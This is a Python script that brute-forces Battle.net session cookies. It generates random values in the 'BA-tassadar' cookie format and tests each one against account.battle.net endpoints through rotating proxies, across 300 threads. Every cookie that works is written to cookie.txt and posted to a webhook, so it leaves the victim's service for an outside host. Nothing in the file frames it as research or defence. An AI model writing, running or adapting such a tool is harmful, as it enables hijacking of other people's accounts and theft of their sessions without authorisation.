import requests
import random
import threading

class Colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def webhook(cookie):

    url = "" 

 
    data = {
        "content" : cookie,
        "username" : "success"
    }


    requests.post(url, json = data)



def check_cookies(cookies):
    proxy = random.choice(proxy_list).strip()
    session = requests.Session()




    cookies = {
        'BA-tassadar': cookies
    }

    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39',
    }
    try:
        session.get('https://account.battle.net/api/', cookies=cookies, headers=headers, proxies={"http": f"http://{proxy}"})

        session.get('https://account.battle.net:443/oauth2/authorization/account-settings', headers=headers, proxies={"http": f"http://{proxy}"}, cookies=cookies)

        session.get('https://account.battle.net/api/overview', headers=headers, proxies={"http": f"http://{proxy}"}, cookies=cookies)
    except:
        return False


    try:
        session.cookies.get_dict()['BA-tassadar']
        return True
    except:
        return False
    

def get_cookies():
    country = ["US", "KR", "EU"]
    alphabets = [chr(i) for i in range(ord('a'), ord('g'))]
    digits = [str(i) for i in range(10)]
    cookie_prefix = alphabets + digits
    cookie_back_letter = digits
    cookie_prefix = random.choices(cookie_prefix, k=32)
    cookie_back_letter = random.choices(cookie_back_letter, k=9)
    countryname = random.choice(country)
    cookie = countryname + "-" + "".join(cookie_prefix) + "-" + "".join(cookie_back_letter)
    return cookie


def main():
    while True:
        cookies = get_cookies()

        if check_cookies(cookies):
            print("GOOD : " + str(cookies))
            webhook(cookies)
            with open("cookie.txt", "w") as f:
                f.write(cookies)
        else:
            print("BAD : " + str(cookies))


filename = 'proxy.txt'
f = open(filename, 'r')
proxy_list = f.readlines()

for i in range(300):
    threading.Thread(target=main).start()


